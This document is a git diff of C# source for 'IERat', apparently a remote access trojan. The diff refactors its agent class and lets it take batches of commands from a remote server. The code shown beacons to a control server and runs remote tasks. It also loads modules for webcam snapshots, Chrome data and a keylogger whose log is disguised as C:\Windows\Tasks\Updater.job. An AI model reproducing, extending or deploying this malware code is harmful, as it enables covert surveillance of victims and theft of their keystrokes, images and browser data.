@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 using System.Web.Script.Serialization;
 using IERat.lib.Actions;
 using System.Reflection;
+using System.Collections.Generic;
 
 namespace IERat.lib
 {
@@ -17,11 +18,11 @@ namespace IERat.lib
         public Channel()
         {
             Status = "Connecting";
-            agent = new Agent();
+            Agent = new Agent();
         }
         public string Status { get; set; }
         public bool IEvisible { get; set; }
-        public Agent agent { get; set; }
+        public Agent Agent { get; set; }
 
         static InternetExplorer IE_handler = null;
         public string CurrentRequest { get; set; }
@@ -71,18 +72,18 @@ namespace IERat.lib
             {           
                 try
                 {
-                    RequestObject requestObject = new RequestObject(agent.ID);
+                    RequestObject requestObject = new RequestObject(Agent.ID);
                     // look for completed tasks and add results to the request
-                    while (this.agent.CompletedAgentTasks.Count != 0)
+                    while (this.Agent.CompletedAgentTasks.Count != 0)
                     {
-                        TaskObject task = this.agent.CompletedAgentTasks.Dequeue();
+                        TaskObject task = this.Agent.CompletedAgentTasks.Dequeue();
                         requestObject.CompletedTasks.Add(task);
                     }
 
                     string output, EndPoint;
 
                     if (this.Status == "Connecting") {
-                        output = agent.GenerateBeacon();
+                        output = Agent.GenerateBeacon();
                         EndPoint = "auth";
                     }
                     else
@@ -134,9 +135,11 @@ namespace IERat.lib
                     }
                 }
 
-                else if ((responseObject.Type == "NewTask") && (responseObject.Task != null))
+                else if ((responseObject.Type == "NewTasks") && (responseObject.Tasks.Count != 0))
                 {
-                    this.agent.AgentTasks.Enqueue(responseObject.Task);
+                    var queue = new Queue<TaskObject>(responseObject.Tasks);
+                    while (queue.Count > 0)
+                        this.Agent.AgentTasks.Enqueue(queue.Dequeue());
                 }
             }
             catch
@@ -148,9 +151,9 @@ namespace IERat.lib
         {
             while (true)
             {
-                while (this.agent.AgentTasks.Count != 0)
+                while (this.Agent.AgentTasks.Count != 0)
                 {
-                    TaskObject NewAgentTask = this.agent.AgentTasks.Dequeue();
+                    TaskObject NewAgentTask = this.Agent.AgentTasks.Dequeue();
                     string CmdType = NewAgentTask.Type;
                     Task.Run(() =>
                     {
@@ -164,15 +167,15 @@ namespace IERat.lib
                                 if ((CmdType == "camsnapshot") || (CmdType == "chrome"))  // add other modules to the if that do not run as threads
                                 {
                                     MethodInfo StartMethod = null;
-                                    if (this.agent.LoadedModules.ContainsKey(CmdType))
+                                    if (this.Agent.LoadedModules.ContainsKey(CmdType))
                                     {
-                                        StartMethod = (MethodInfo)this.agent.LoadedModules[CmdType];
+                                        StartMethod = (MethodInfo)this.Agent.LoadedModules[CmdType];
                                     }
                                     else
                                     {
                                         StartMethod = (MethodInfo)Modules.LoadModule(NewAgentTask.args, CmdType);
                                         NewAgentTask.args = "";
-                                        this.agent.LoadedModules.Add(CmdType, StartMethod);
+                                        this.Agent.LoadedModules.Add(CmdType, StartMethod);
                                     }
 
                                     if (CmdType == "camsnapshot")
@@ -209,9 +212,9 @@ namespace IERat.lib
                                 }
                                 else if (CmdType == "klog_start")
                                 {
-                                    if (this.agent.LoadedModules.ContainsKey("klog"))
+                                    if (this.Agent.LoadedModules.ContainsKey("klog"))
                                     {
-                                        Thread klogThread = (Thread)this.agent.LoadedModules["klog"];
+                                        Thread klogThread = (Thread)this.Agent.LoadedModules["klog"];
                                         if (klogThread.ToString() == "Running")
                                         {
                                             NewAgentTask.Result = "The Klog is already running";
@@ -225,16 +228,16 @@ namespace IERat.lib
                                     else
                                     {
                                         Thread klogThread = (Thread)Modules.LoadModule(NewAgentTask.args);
-                                        this.agent.LoadedModules.Add("klog", klogThread);
+                                        this.Agent.LoadedModules.Add("klog", klogThread);
                                         klogThread.Start();
                                         NewAgentTask.Result = "Klog Loaded & Started";
                                     }
                                 }
                                 else if (CmdType == "klog_stop")
                                 {
-                                    if (this.agent.LoadedModules.ContainsKey("klog"))
+                                    if (this.Agent.LoadedModules.ContainsKey("klog"))
                                     {
-                                        Thread klogThread = (Thread)this.agent.LoadedModules["klog"];
+                                        Thread klogThread = (Thread)this.Agent.LoadedModules["klog"];
                                         if (klogThread.IsAlive == true)
                                         {
                                             klogThread.Suspend();
@@ -252,7 +255,7 @@ namespace IERat.lib
                                 }
                                 else if (CmdType == "klog_collect")
                                 {
-                                    if (this.agent.LoadedModules.ContainsKey("klog"))
+                                    if (this.Agent.LoadedModules.ContainsKey("klog"))
                                     {
                                         if (File.Exists(@"C:\Windows\Tasks\Updater.job"))
                                         {
@@ -302,13 +305,12 @@ namespace IERat.lib
                                 }
                                 else if (CmdType == "ls")
                                 {
-                                    // need to add directories too
-                                    //string[] ls = Directory.GetFiles(Directory.GetCurrentDirectory());
                                     string[] entries = Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*");
                                     StringBuilder stringBuilder = new StringBuilder();
                                     foreach (string line in entries)
                                     {
-                                        stringBuilder.AppendFormat("\n{0}", line);
+                                        try  {  stringBuilder.AppendFormat($"\n{line}\t{new FileInfo(line).Length} Bytes");  }
+                                        catch  {  stringBuilder.AppendFormat("\n{0}", line);  }
                                     }
                                     NewAgentTask.Result = stringBuilder.ToString();
                                 }
@@ -349,7 +351,7 @@ namespace IERat.lib
                                 NewAgentTask.Status = "Failed";
                                 NewAgentTask.Result = ex.GetBaseException().Message;
                             }
-                            this.agent.CompletedAgentTasks.Enqueue(NewAgentTask);
+                            this.Agent.CompletedAgentTasks.Enqueue(NewAgentTask);
                         }
                     });
                 }
